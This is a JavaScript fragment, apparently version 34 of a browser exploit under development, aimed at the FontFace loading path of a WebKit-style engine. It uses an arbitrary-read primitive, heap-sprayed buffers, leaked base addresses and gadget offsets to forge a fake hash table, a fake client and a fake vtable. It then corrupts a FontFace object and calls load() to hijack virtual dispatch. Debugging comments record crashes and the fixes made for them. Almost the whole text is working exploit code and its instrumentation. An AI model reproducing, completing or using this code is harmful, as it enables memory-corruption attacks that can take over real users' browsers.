// V34 Patch: d0c refcount-offset discovery - READ-ORDER FIXED
//
// V33-d0c CRASHED - but the code was correct: it entered the d0c branch and
// called load() with the REAL client (the d0a path). The delta vs d0a
// (which RETURNED): the d0c instrumentation ran readAt(FB, 0x40) BEFORE
// load(). Per the read-carrier poisoning doctrine, every readAt poisons
// the carrier's request fields - and a 64-byte read at FB+0x00 overlaps
// the REAL wrapper's vtable/m_backing/promise/ActiveDOMObject state.
// d0a's narrower reads (+0x18, +0x10, +0x00 for identity) didn't hit it
// the same way; the big pre-read did.
//
// V34 FIX: reorder the d0c arm to the SAME discipline as the face craft:
//   1. ALL identity reads (promise, sibling, timer) FIRST
//   2. CRAFT the face (the v29 FACE-CRAFT block - sources/status/timer)
//   3. THEN snapshot FB (readAt(FB,0x40)) - the LAST read before load
//   4. load()
//   5. readAt(FB,0x40) again + diff = THE REFCount OFFSET
// The FB snapshot lands in the same "post-craft, pre-load" slot as the
// gate readbacks - which the v29/v31 runs prove are safe (G1..G5 read
// sv/hitBuf directly, and the born/weak/d0a/d0b LOADs all survived the
// craft-then-read order).
//
// THE LADDER (?arm=): born|weak|d0c|d0a|d0b|d0|d1
//   d0c = the refcount-offset discovery (this file's purpose)

/* ==== v34: THE FIXED FORGE + d0c ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V34-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      var ARM=(function(){var m=/[?&]arm=(born|weak|d0c|d0a|d0b|d0|d1)/.exec(location.search);return m?m[1]:'born';})();
      bs('V34-ARM='+ARM);

      /* ---- STEP 1: ALL readAt FIRST (identity reads) ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V34-PROMISE-ADDR='+hex(promiseAddr));
      var promiseBefore=readAt(promiseAddr,0x30);
      bs('V34-PROMISE-BEFORE='+promiseBefore);

      bs('V34-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V34-NO-SIBLING');verd('err','v34 no sibling');throw 'no sibling';}
      bs('V34-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V34-TIMER-BORROWED='+timerH);

      /* ---- d0c: THE REFCOUNT-OFFSET DISCOVERY (read-order fixed) ---- */
      if(ARM==='d0c'){
        /* 1. craft the face FIRST (all readAt above are done) */
        bs('V34-d0c-FACE-CRAFT');
        for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;
        for(var sz2=0x48;sz2<=0x57;sz2++)hitBuf[sz2]=0;
        for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
        hitBuf[0x82]=0; hitBuf[0x83]=1; hitBuf[0x87]=1;
        for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
        for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
        for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;
        for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;
        /* m_ptr = FB (the REAL wrapper) - the d0a configuration */
        var sv2=new DataView(window.__v688.spray[mIdx]);
        for(var ib2=0;ib2<0x20;ib2++)sv2.setUint8(ib2,parseInt(l2raw.substr(ib2*2,2),16));
        dvSetBig(sv2,0x08,FB);
        sv2.setUint32(0x20,0,true); sv2.setUint32(0x24,1,true);
        sv2.setUint32(0x28,3,true); sv2.setUint32(0x2C,4,true);
        dvSetBig(sv2,0x30,S); dvSetBig(sv2,0x38,0n); dvSetBig(sv2,0x40,0n); dvSetBig(sv2,0x48,0n);
        for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);
        bs('V34-d0c-INSTALLED-tblPtr='+hex(S+0x30n)+'-m_ptr=FB');

        /* 2. THEN snapshot FB - the LAST read before load */
        var fbBefore=readAt(FB,0x40);
        bs('V34-FB-BEFORE='+fbBefore);

        /* 3. load */
        bs('V34-LOAD-PRE');
        var loadR=false;
        try{faces[zi].load();loadR=true;bs('V34-LOAD-RETURNED');}
        catch(e){bs('V34-LOAD-THREW-'+String(e&&e.message?e.message:'?'));}

        bs('V34-POST-returned='+loadR);
        bs('V34-STATUS-AFTER='+hitBuf[0x82]);
        try{bs('V34-JS-STATUS='+faces[zi].status);}catch(e){bs('V34-JS-STATUS-ERR');}

        /* 4. diff = THE REFCount OFFSET */
        var fbAfter=readAt(FB,0x40);
        bs('V34-FB-AFTER='+fbAfter);
        if(fbAfter!==fbBefore){
          var fbDiffs=[];
          for(var fd=0;fd<0x40;fd+=4){
            var b4=parseInt(fbBefore.substr(fd*2,8),16),a4=parseInt(fbAfter.substr(fd*2,8),16);
            if(a4!==b4)fbDiffs.push('@FB+0x'+fd.toString(16)+':'+b4.toString(16)+'>'+a4.toString(16));
          }
          bs('WIT-V34-FB-DIFF-'+fbDiffs.join('|'));
        }else bs('WIT-V34-FB-unchanged');
        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
        bs('V34-RESTORED');
        if(loadR){verd('ok','V34 d0c RETURNED');bs('V34-DONE-d0c-RETURNED');}
        else{verd('err','V34 d0c crashed');bs('V34-DONE-d0c-CRASHED');}
        return;
      }

      /* ---- STEP 2: build the FORGE (METADATA VIA setUint32 - THE FIX) ---- */
      bs('V34-FORGE-BUILD');

      /* impl = real L2 byte-copy; m_ptr per arm */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      if(ARM==='weak')        dvSetBig(sv,0x08,0n);        /* null client -> entry removed */
      else if(ARM==='d0a')    dvSetBig(sv,0x08,FB);         /* the REAL FontFace wrapper -> real vtable, real everything */
      else if(ARM==='d0'||ARM==='d1'||ARM==='d0b')dvSetBig(sv,0x08,S+0x50n); /* fake client */
      else                    dvSetBig(sv,0x08,0n);        /* born: unreferenced anyway */
      var implRcBefore=sv.getUint32(0x00,true);
      bs('V34-IMPL-rc='+implRcBefore+'-m_ptr='+hex(dvGetBig(sv,0x08)));

      /* *** THE FIX: metadata via DataView.setUint32 (put32 was a NO-OP!) *** */
      sv.setUint32(0x20, 0, true);                 /* deletedCount = 0 */
      sv.setUint32(0x24, (ARM==='born')?0:1, true);/* keyCount: 0 born, else 1 */
      sv.setUint32(0x28, 3, true);                 /* tableSizeMask = 3 */
      sv.setUint32(0x2C, 4, true);                 /* tableSize = 4 */

      /* buckets */
      if(ARM==='born'){
        dvSetBig(sv,0x30,0n); dvSetBig(sv,0x38,0n);
        dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
      }else{
        dvSetBig(sv,0x30,S);                       /* bucket[0] = impl */
        dvSetBig(sv,0x38,0n); dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
      }

      /* client = real wrapper byte-copy (used by d0/d0b/d1; unreferenced otherwise)
       * d0a uses the REAL wrapper at FB (m_ptr=FB) - no copy involved.
       * d0b keeps the copy's +0x00 = the REAL vtable pointer (UNPATCHED)
       *      -> dispatches run the REAL FontFace methods on the fake client. */
      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
      if(ARM==='d0'||ARM==='d1')dvSetBig(sv,0x50+0x00,S+0x90n); /* fake vtable */
      /* d0b: leave client+0x00 = the real VP (from fbRaw) */
      /* client+0x18 promise deliberately kept = the REAL promise (fbRaw copy) */
      var clientPromise=dvGetBig(sv,0x50+0x18);
      bs('V34-CLIENT-PROMISE='+hex(clientPromise)+(clientPromise===promiseAddr?'-IS-REAL-OK':'-MISMATCH'));
      if(ARM==='d0b')bs('V34-CLIENT-VT-REAL='+hex(dvGetBig(sv,0x50)));

      /* vtable */
      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
      if(ARM==='d1')dvSetBig(sv,0x90+0x18,FSG);    /* slot3 = real fontStateChanged */

      bs('V34-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-slot3='+hex(dvGetBig(sv,0x90+0x18)));

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE ---- */
      bs('V34-FACE-CRAFT');
      for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;
      /* +0x48..0x57: the SOURCES VECTOR - poisoned by the read-carrier
       * (G4 in the first run read 3f/65/0x824/46 = scan-grid garbage;
       * m_sources.size() at +0x54 was 0x46 = 70 phantom sources!). MUST
       * be zeroed so pump sees an empty vector. */
      for(var sz2=0x48;sz2<=0x57;sz2++)hitBuf[sz2]=0;
      /* +0x60..0x67: the WeakHashSet counters — also poisoned by the
       * read-carrier (G3 read 0x8c00000055). Zero them in the FACE craft
       * (runs after all readAt). */
      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
      hitBuf[0x82]=0;                              /* status = Pending */
      hitBuf[0x83]=1;                              /* sourcesPopulated */
      hitBuf[0x87]=1;                              /* override = Block */
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;   /* fire times = 0 */
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;/* heapItem = NULL */

      /* ---- STEP 4: install (LAST write) ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);

      /* ---- STEP 5: GATES ---- */
      var gatesOK=true;
      function hx(u8){var s='';for(var i=0;i<u8.length;i++)s+=('0'+u8[i].toString(16)).slice(-2);return s;}

      /* G1: metadata exact-hex (DataView reads only) */
      var g1bytes=[];for(var g1=0;g1<16;g1++)g1bytes.push(sv.getUint8(0x20+g1));
      var g1hex=g1bytes.map(function(x){return ('0'+x.toString(16)).slice(-2);}).join('');
      var expectHex=(ARM==='born')?'00000000000000000300000004000000':'00000000010000000300000004000000';
      bs('V34-G1-meta-hex='+g1hex+'-expect='+expectHex);
      var g1d0=sv.getUint32(0x20,true),g1kc=sv.getUint32(0x24,true),g1m=sv.getUint32(0x28,true),g1s=sv.getUint32(0x2C,true);
      bs('V34-G1-dwords-d='+g1d0+'-kc='+g1kc+'-mask='+g1m+'-size='+g1s);
      if(g1hex!==expectHex){gatesOK=false;bs('V34-G1-FAIL');}
      if(g1d0===0x02468ACE||g1kc===0x13579BDF){gatesOK=false;bs('V34-G1-FAIL-MARKER-A-STILL-PRESENT');}

      /* G2: face+0x58 */
      var g2=0n;for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
      bs('V34-G2-face58='+hex(g2));
      if(g2!==(S+0x30n)){gatesOK=false;bs('V34-G2-FAIL');}

      /* G3: face counters unchanged */
      var g3=0n;for(var g3b=0;g3b<8;g3b++)g3|=BigInt(hitBuf[0x60+g3b])<<BigInt(g3b*8);
      bs('V34-G3-face60='+hex(g3));
      if(g3!==0n){gatesOK=false;bs('V34-G3-FAIL');}

      /* G4: sources vector all zero (hard abort if dirty) */
      var g4dirty=false;for(var g4=0x48;g4<0x58;g4++)if(hitBuf[g4]!==0)g4dirty=true;
      bs('V34-G4-sources='+hx(hitBuf.slice(0x48,0x58)));
      if(g4dirty){gatesOK=false;bs('V34-G4-FAIL-SOURCES-DIRTY');}

      /* G5: status/override/timer PREDICATED */
      var g5vptr=0n;for(var q9=0;q9<8;q9++)g5vptr|=BigInt(hitBuf[0x90+q9])<<BigInt(q9*8);
      var g5thread=0n;for(var q10=0;q10<8;q10++)g5thread|=BigInt(hitBuf[0xB0+q10])<<BigInt(q10*8);
      var g5heap=0n;for(var q11=0;q11<8;q11++)g5heap|=BigInt(hitBuf[0xA8+q11])<<BigInt(q11*8);
      var g5fire=0n;for(var q12=0;q12<16;q12++)g5fire|=BigInt(hitBuf[0x98+q12])<<BigInt(q12*8);
      bs('V34-G5-status='+hitBuf[0x82]+'-ovr='+hitBuf[0x87]+'-vptr='+hex(g5vptr)+'-thread='+hex(g5thread)+'-heap='+hex(g5heap)+'-fire='+hex(g5fire));
      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1&&g5vptr!==0n&&g5thread!==0n&&g5heap===0n&&g5fire===0n)){
        gatesOK=false;bs('V34-G5-FAIL');
      }

      if(!gatesOK){
        bs('V34-GATE-FAIL-ABORT-NO-LOAD');
        verd('err','V34 gate fail - load() NOT called');
      }else{
        bs('V34-GATES-ALL-OK');

        /* ---- STEP 6: THE DISPATCH ---- */
        bs('V34-LOAD-PRE');
        var loadReturned=false;
        try{
          faces[zi].load();
          loadReturned=true;
          bs('V34-LOAD-RETURNED');
        }catch(e){
          bs('V34-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
        }

        /* ---- STEP 7: COMPOSITE WITNESS (one beacon) ---- */
        var opcnt=hitBuf[0x60]|(hitBuf[0x61]<<8)|(hitBuf[0x62]<<16)|(hitBuf[0x63]<<24);
        var postMeta='';for(var pm=0;pm<16;pm++)postMeta+=('0'+sv.getUint8(0x20+pm).toString(16)).slice(-2);
        var postBk0=dvGetBig(sv,0x30);
        var postRc=sv.getUint32(0x00,true);
        var postVt=hitBuf[0x90]!==0;
        bs('V34-WIT-status='+hitBuf[0x82]+'-opcount='+opcnt+'-meta='+postMeta+'-bk0='+hex(postBk0)+'-implrc='+postRc+'-timerVptrOK='+postVt);

        try{bs('V34-JS-STATUS='+faces[zi].status);}catch(e){bs('V34-JS-STATUS-ERR');}

        /* promise witness (readAt safe now) */
        var promiseAfter=readAt(promiseAddr,0x30);
        if(promiseAfter!==promiseBefore)bs('WIT-V34-PROMISE-CHANGED');
        else bs('WIT-V34-PROMISE-UNCHANGED');

        /* forge diff */
        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
        var diffs=[];
        for(var wq=0;wq<0x100;wq+=8){
          var cur=0n,old=0n;
          for(var wb=0;wb<8;wb++){
            cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
            old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
          }
          if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
        }
        if(diffs.length)bs('WIT-V34-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
        else bs('WIT-V34-FORGE-nowrite');

        for(var rb2=0;rb2<8;rb2++)hitBuf[0x58+rb2]=Number((L1>>BigInt(rb2*8))&0xFFn);
        bs('V34-RESTORED');

        if(loadReturned){
          verd('ok','V34 '+ARM+' RETURNED');
          bs('V34-DONE-'+ARM+'-RETURNED');
        }else{
          verd('err','V34 '+ARM+' crashed');
          bs('V34-DONE-'+ARM+'-CRASHED');
        }
      }

    }else bs('V34-SKIP-bad-idx');
  }else bs('V34-SKIP-missing-data');
}catch(e34){bs('V34-ERR-'+String(e34&&e34.message?e34.message:'?'));}
/* ==== V34 END ==== */